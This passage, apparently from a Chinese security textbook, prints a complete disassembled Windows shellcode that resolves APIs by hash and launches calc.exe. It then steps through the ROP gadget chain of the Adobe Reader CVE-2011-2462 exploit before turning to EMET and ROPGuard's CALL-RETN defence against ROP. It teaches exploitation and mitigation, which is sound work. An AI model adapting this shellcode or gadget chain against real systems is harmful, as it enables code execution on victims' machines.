seg000:00000000 cld
seg000:00000001 call loc_8F
seg000:00000006 pusha
seg000:00000007 mov ebp, esp
seg000:00000009 xor edx, edx
seg000:0000000B mov edx, fs:[edx+30h]
seg000:0000000F mov edx, [edx+0Ch]
seg000:00000012 mov edx, [edx+14h]
seg000:00000015
seg000:00000015 loc_15:
seg000:00000015 mov esi, [edx+28h]
seg000:00000018 movzx ecx, word ptr [edx+26h]
seg000:0000001C xor edi, edi
seg000:0000001E
seg000:0000001E loc_1E:
seg000:0000001E xor eax, eax
seg000:00000020 lodsb
seg000:00000021 cmp al, 61h ; 'a'
seg000:00000023 jl short loc_27
seg000:00000025 sub al, 20h ; ' '
seg000:00000027
seg000:00000027 loc_27:
seg000:00000027 ror edi, 0Dh
seg000:0000002A add edi, eax
seg000:0000002C loop loc_1E
seg000:0000002E push edx
seg000:0000002F push edi
seg000:00000030 mov edx, [edx+10h]
seg000:00000033 mov eax, [edx+3Ch]
seg000:00000036 add eax, edx
seg000:00000038 mov eax, [eax+78h]
seg000:0000003B test eax, eax
seg000:0000003D jz short loc_89
seg000:0000003F add eax, edx
seg000:00000041 push eax
seg000:00000042 mov ecx, [eax+18h]
seg000:00000045 mov ebx, [eax+20h]
seg000:00000048 add ebx, edx
seg000:0000004A
seg000:0000004A loc_4A:
seg000:0000004A jecxz short loc_88
seg000:0000004C dec ecx
seg000:0000004D mov esi, [ebx+ecx*4]
seg000:00000050 add esi, edx
seg000:00000052 xor edi, edi
seg000:00000054
seg000:00000054 loc_54:
seg000:00000054 xor eax, eax
seg000:00000056 lodsb
seg000:00000057 ror edi, 0Dh
seg000:0000005A add edi, eax
seg000:0000005C cmp al, ah
seg000:0000005E jnz short loc_54
seg000:00000060 add edi, [ebp-8]
seg000:00000063 cmp edi, [ebp+24h]
seg000:00000066 jnz short loc_4A
seg000:00000068 pop eax
seg000:00000069 mov ebx, [eax+24h]
seg000:0000006C add ebx, edx
seg000:0000006E mov cx, [ebx+ecx*2]
seg000:00000072 mov ebx, [eax+1Ch]
seg000:00000075 add ebx, edx
seg000:00000077 mov eax, [ebx+ecx*4]
seg000:0000007A add eax, edx
seg000:0000007C mov [esp+24h], eax
seg000:00000080 pop ebx
seg000:00000081 pop ebx
seg000:00000082 popa
seg000:00000083 pop ecx
seg000:00000084 pop edx
seg000:00000085 push ecx
seg000:00000086 jmp eax
seg000:00000088
seg000:00000088 loc_88:
seg000:00000088 pop eax
seg000:00000089
seg000:00000089 loc_89:
seg000:00000089 pop edi
seg000:0000008A pop edx
seg000:0000008B mov edx, [edx]
seg000:0000008D jmp short loc_15
seg000:0000008F
seg000:0000008F loc_8F:
seg000:0000008F pop ebp
seg000:00000090 push 1
seg000:00000092 lea eax, [ebp+0B9h]
seg000:00000098 push eax
seg000:00000099 push 876F8B31h
seg000:0000009E call ebp
seg000:000000A0 mov ebx, 56A2B5F0h
seg000:000000A5 push 9DBD95A6h
seg000:000000AA call ebp
seg000:000000AC cmp al, 6
seg000:000000AE jl short loc_BA
seg000:000000B0 cmp bl, 0E0h
seg000:000000B3 jnz short loc_BA
seg000:000000B5 mov ebx, 6F721347h
seg000:000000BA
seg000:000000BA loc_BA:
seg000:000000BA
seg000:000000BA push 0
seg000:000000BC push ebx
seg000:000000BD call ebp
seg000:000000BD
seg000:000000BF db 63h
seg000:000000C0 db 61h ; a
seg000:000000C1 db 6Ch ; l
seg000:000000C2 db 63h ; c
seg000:000000C3 db 2Eh ; .
seg000:000000C4 db 65h
seg000:000000C5 db 78h ; x
seg000:000000C6 db 65h ; e
seg000:000000C7 db 0
seg000:000000C7 seg000 ends
通过阅读工具生成出来的代码，大家可以对 shellcode 进一步加深
理解。
5.1.5 一个 ROP 的实际例子
下面我们以 CVE-2011-2462 为例，介绍一个第 3 章中曾经提到过的
ROP 的实际例子。
首先，我们用 Metasploit 生成一个用于攻击的 PDF 文件。
Adobe Reader U3D Memory Corruption Vulnerability
http://www.rapid7.com/db/modules/exploit/windows/fileformat/adobe_reader_u3d
▲ 用 Metasploit 生成 CVE-2011-2462 的攻击代码
接下来，我们将 OllyDbg 设为实时调试器。然后，将 rt3d.dll 的 ROP 子
程序运行之前的地方改为 int3（0xCC）。
▲ 将 rt3d.dll 的 0014CAB9 位置改为 0xCC
用 Adobe Reader 打开这个 PDF 文件，OllyDbg 会自动打开，我们可以
查看一下发生问题的地方。
首先，我们将 0xCC 恢复为 0xFF。
▲ rt3d.dll 中的 CALL DWORD PTR DS:[EAX+1C]
顾名思义，ROP（面向返回编程）就是将一些以返回（ret 指令）结束
的代码片段拼接起来，从而实现真正期望的逻辑。在 ROP 中，要运行
的代码被配置在栈中，通过巧妙地调整进行跳转并运行这些代码。简单
来说，就是用 ret 代替 jmp 来进行跳转。
CVE-2011-2462 中，当 EAX=0C0C0C0C 时，会执行下面的逻辑。
▲ 通过 ROP 运行代码片段
// 代码
4A806CEF 94 XCHG EAX,ESP
4A806CF0 C0EB 02 SHR BL,2
4A806CF3 32C0 XOR AL,AL
4A806CF5 5F POP EDI
4A806CF6 5E POP ESI
4A806CF7 C3 RETN
// 栈
0C0C0C0C 0C0C0C0C POP EDI
0C0C0C10 0C0C0C0C POP ESI
0C0C0C14 4A806F29 下一个跳转目标
4A806CEF 的 XCHG EAX,ESP 使得 ESP=0C0C0C0C，然后是两条 POP
指令，最后跳转到 4A806F29。其中，RETN 并没有返回原始调用地
址，而是跳转到了下面的代码。
// 代码
4A806F29 5F POP EDI
4A806F2A 5E POP ESI
4A806F2B 5D POP EBP
4A806F2C C2 1400 RETN 14
// 栈
0C0C0C18 4A8A0000 POP EDI
0C0C0C1C 4A802196 POP ESI
0C0C0C20 4A801F90 POP EBP
0C0C0C24 4A806F29 下一个跳转目标
返回 4A806F29 之后，又是 3 条 POP 指令，接下来执行 RETN 14。
跳转到目标 4A806F29 之后，又运行了一遍同样的代码。
这些代码的目的是逐步调整寄存器的值。
如果希望向任意地址写入数据，可以像下面这样进行拼接。
4A8063A5 59 POP ECX
4A8063A6 C3 RETN
4A802196 8901 MOV DWORD PTR DS:[ECX],EAX
4A802198 C3 RETN
4A801F90 58 POP EAX ; 
4A801F91 C3 RETN
用 RETN 跳转到 CALL EAX 时，就可以调用 CreateFileA。
上面这样的做法让人感觉特别勉强，但现实中的确可以用来进行攻击，
因此 ROP 可以说是一种十分有用的技巧。
5.2 用 EMET 观察反 ROP 的机制
5.2.1 什么是 EMET
EMET 全称为 Enhanced Mitigation Experience Toolkit（增强减灾体验工
具），是微软发布的一款免费的漏洞缓解工具。3.0 及之前版本中，其
主要特长是“强化现有的安全机制”，从 3.5 版开始则增加了一些新的实
验性的探测功能。
截止到现在（2013/05/10），EMET 的最新版本为 4.0β。
Introducing EMET v4 Beta
http://blogs.technet.com/b/srd/archive/2013/04/18/introducing-emet-v4-
beta.aspx
EMET 中比较有意思的一个功能是 3.5 版中在现有功能基础上新增的反
ROP（Anti-ROP）机制。
第 3 章中我们已经介绍过，现在的操作系统中默认都开启了 ASLR、
DEP（Exec-Shield）等安全机制，因此作为新的攻击手段，ROP 正越来
越受到重视，而 EMET 正是最早提出并实现反 ROP 机制的工具。
5.2.2 Anti-ROP 的设计获得了蓝帽奖
EMET 中的 Anti-ROP 曾在微软 2012 年举办的计算机安全方案大赛“蓝
帽奖”（BlueHat Prize）中获奖。
BlueHat Prize
http://www.microsoft.com/security/bluehatprize/
这项大赛设置了高额的奖金，冠军 20 万美元，亚军 5 万美元，季军 1
万美元。而获奖的方案全部都与 ROP 相关，而且这些方案都非常实
用。
各获奖者的方案已经公开发布在网上，大家有兴趣的话一定要读一读。
kBouncer: Efficient and Transparent ROP Mitigation
http://www.cs.columbia.edu/~vpappas/papers/kbouncer.pdf
ROPGuard - runtime prevention of return-oriented programming
attacks
http://ifsec.blogspot.jp/2012/08/my-bluehat-prize-entry-ropguard-
runtime.html
BlueHat Prize Submission:/ROP
http://www.vdalabs.com/tools/DeMott_BlueHat_Submission.pdf
5.2.3 如何防止攻击
“如何保护应用程序不受新方法的攻击”，这不但是蓝帽奖的主题，同时
也是安全研究人员的共同课题。安全专家们相继发明了 ASLR、Exec-
Shield（DEP）、StackGuard 等安全机制，但即便如此，还是无法根绝
所有的漏洞。
总之，安全技术研究的目标在于下面两点。
保护应用程序不受各种漏洞的影响
设计出不会产生漏洞的架构
作为蓝帽奖获奖方案之一的“ROPGuard - runtime prevention of return-
oriented programming attacks”为我们提出了一种非常实用的应对 ROP 的
方法。
ROPGuard 简单来说就是一种检查“RETN 所返回的目标有没有相对应的
CALL”（即 CALL-RETN 匹配性）的机制。这个方案非常简单，但是却
能够十分有效地检测出 Return-into-libc 和 ROP 攻击。
我们知道，CALL 用来调用子程序，而在子程序的结尾，（大部分情况
下）都会执行 RETN，而子程序结尾的 RETN 所返回的目标地址，应该
就是 CALL 指令的下面一条指令。
然而，在 Return-into-libc 攻击中，RETN 会跳转到函数的开头，而 ROP
攻击中则使用了非常多的 RETN，这些都会导致出现“RETN 并不是返回
CALL 的下一条指令”的情况。
因此，这个方案的本质在于关注 CALL 和 RETN 的匹配性（调用栈回
溯），以此来检测 ROP 和 Return-into-libc 攻击。
当然，在实现上也会有很多需要解决的难题，比如下面这些。
在什么时间点调用栈回溯
在哪一层进行检查
会不会误判
5.2.4 搞清楚加载器的逻辑
ROPGuard 除了方案之外，还发布了相应的源代码。
大家可以下载原始的代码，为了便于本书中的讲解，笔者在 GitHub 上
发布了一个简化版，省略了一些冗余的代码，大家也可以使用这个版
本。
ROPGuard-Cheap
https://github.com/kenjiaiko/ropguard_cheap
本章中我们会使用 ROPGuard-Cheap 来进行讲解。当然，用原版也没有
问题，只是需要注意一点，在原版中，load_rg.exe 的名字叫
ropguard.exe，而 ropguard.dll 则叫作 ropguarddll.dll。
下面我们来看一下程序的逻辑。
这个工具是通过 DLL 注入来保护目标进程的，它包括
chap05\ropguard_cheap\Release 中的这两个文件。
load_rg.exe（ropguard.exe）
ropguard.dll（ropguarddll.dll）
load_rg.exe 实质上只是一个加载器，真正关于 Anti-ROP 的逻辑都在
ropguard.dll 中。
不过，为了确认，我们还是先来看一看 load_rg.exe。
请大家用 VC++2010 打开 ropguard\ropguard.sln 文件。这个工程中包含
以下文件（源代码见 chap05\ropguard_cheap，此处省略源代码）。
main.cpp（load_rg\main.cpp）
createprocess.cpp（common\createprocess.cpp）
patchentrypoint.cpp（common\patchentrypoint.cpp）
debug.cpp（common\debug.cpp）
其中 main.cpp 主要包含 main 函数以及相关逻辑，它的功能是从参数中
获取进程 ID 或者可执行文件的路径，然后向目标进程注入
DLL（ropguard.dll）。
根据参数的不同，会分别调用下面两个函数。
进程 ID ：调用 GuardExistingProcess
可执行文件路径：调用 CreateNewGuardedProcess
这些逻辑位于 createprocess.cpp 中，在这个文件中还包含下面的逻辑。
向目标进程注入 DLL
劫持 CreateProcessInternalW，让进程暂停运行（添加
CREATE_SUSPENDED 标志）
CreateProcessInternalW 的钩子用于 DLL 中的逻辑，加载器并不使用